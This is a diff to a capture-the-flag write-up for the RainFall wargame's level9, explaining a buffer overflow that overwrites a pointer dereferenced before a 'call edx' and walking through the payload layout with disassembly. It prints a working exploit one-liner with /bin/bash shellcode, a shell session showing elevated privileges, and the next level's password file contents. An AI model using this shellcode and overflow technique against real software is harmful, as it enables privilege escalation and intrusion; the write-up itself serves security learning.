@@ -1,4 +1,9 @@
-The stack, BSS and data sections are executables, the NX flag isn't set, we'll get a /bin/bash shellcode and jump on it through the call edx instruction.
+# Analysis
+
+
+The program calls a memcpy of our argv[1] into a buffer.
+After the memcpy, the 4 next bytes are dereferenced (through eax) and edx is set to the value.
+The stack, BSS and data sections are executables, the NX flag isn't set, thanks to a buffer overflow followed by a call to edx, we can modify edx value and call any address we want.
 08048000-08053000 r-xp 00000000 07:00 12547      /bin/cat
 08053000-08054000 r--p 0000a000 07:00 12547      /bin/cat
 08054000-08055000 rw-p 0000b000 07:00 12547      /bin/cat
@@ -15,19 +20,28 @@ b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
 b7ffe000-b7fff000 r--p 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
 b7fff000-b8000000 rw-p 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
 bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
+We also see that the buffer is stored within 08048000-08053000 addresses section, which is executable.
 
-level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A"*71 + "\x0c\xa0\x04\x08"'`
-bash-4.2$ id
-uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
-bash-4.2$ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+# Exploit
 
-What the program does:
-memcpy of our argv[1] into a buffer withing 0x8048000-0x8053000 range addresses, that are executable. We can overflow the
-next 4 bytes that are dereferenced (through eax) and edx is set to the value.
-Then, edx is called through `call edx`
+We'll get a /bin/bash shellcode and jump on it through the call edx instruction, the code will be executed because the section is executable.
+
+# Crafting
+
+By overflowing the next 4 bytes, we need to set an address that can be dereferenced, pointing to our shellcode address : we'll store our shellcode into the buffer, and put
+address of (buffer + 4) right at the beginning of our buffer.
+After the first eax dereferencement, edx will contain the address of our shellcode, since the next instruction is "call edx", our code will be executed.
+   0x08048680 <+140>:	mov    eax,DWORD PTR [eax] ; After that instruction, eax contains the 4 bytes that we overflowed on the buffer
+   0x08048682 <+142>:	mov    edx,DWORD PTR [eax] ; After this one, these 4 bytes, which is an address of the beginning of our buffer, will be given to edx
+   [...]
+   0x08048693 <+159>:	call   edx ; Then, this address will be called, and it points to our shellcode just 4 bytes next in the buffer.
 
 The payload has this form:
+
+ BUFFER_ADDR
+ |
+ |
+ v
  [BUFFER_ADDR + 4][SHELLCODE][RANDOM_PADDING_STRING][BUFFER_ADDR]
           |           ^                                  |
     ^-----------------------------------------------------
@@ -37,5 +51,11 @@ The payload has this form:
 What will happen here:
 BUFFER_ADDR is dereferenced and passed to edx
 edx = [BUFFER_ADDR + 4]
-Then edx is called, so we jump on our Shellcode that runs a /bin/bash shell.
-That's it.
+
+# Shooting
+
+level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A"*71 + "\x0c\xa0\x04\x08"'`
+bash-4.2$ id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+bash-4.2$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
